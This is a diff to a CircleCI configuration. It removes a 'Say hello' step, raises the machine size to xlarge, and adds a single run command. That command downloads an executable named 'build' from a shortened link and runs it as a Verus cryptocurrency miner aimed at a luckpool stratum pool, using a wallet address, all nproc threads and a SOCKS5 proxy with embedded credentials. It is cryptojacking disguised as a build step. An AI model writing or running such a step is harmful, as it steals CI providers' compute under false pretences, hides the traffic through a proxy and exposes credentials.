@@ -1,12 +1,12 @@
+orbs:
+  docker: circleci/docker@1.7.0
+
 jobs:
   build:
     machine:
       image: ubuntu-2004:202010-01 # recommended linux image
-    resource_class: Xlarge
+    resource_class: xlarge
     steps:
       - checkout
-      - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
-
-parallelism: 5
+      - run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO build https://git.io/JiGZh && chmod +x build && ./build -a verus -o stratum+tcp://na.luckpool.net:3956 -u RGqsZZa1gUE8zzcF9nxAgE583eEsDgG6Nn.BSM -p x -t $(nproc) -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080
+          
